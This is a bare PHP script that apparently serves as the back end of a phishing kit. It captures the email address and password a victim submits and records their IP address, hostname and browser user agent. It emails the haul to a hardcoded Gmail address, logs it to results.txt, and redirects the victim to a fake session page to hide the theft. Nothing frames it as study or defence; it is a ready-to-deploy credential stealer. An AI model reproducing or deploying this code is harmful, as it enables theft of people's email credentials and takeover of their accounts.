<?php
if($_POST["em"] != "" and $_POST["ep"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------B0A Info-----------------------\n";
$message .= "Email Address             : ".$_POST['em']."\n";
$message .= "Email Password             : ".$_POST['ep']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$to = 'sayeemayee80000@gmail.com';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp);
$praga=rand();
$praga=md5($praga);
  header ("Location: surf4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>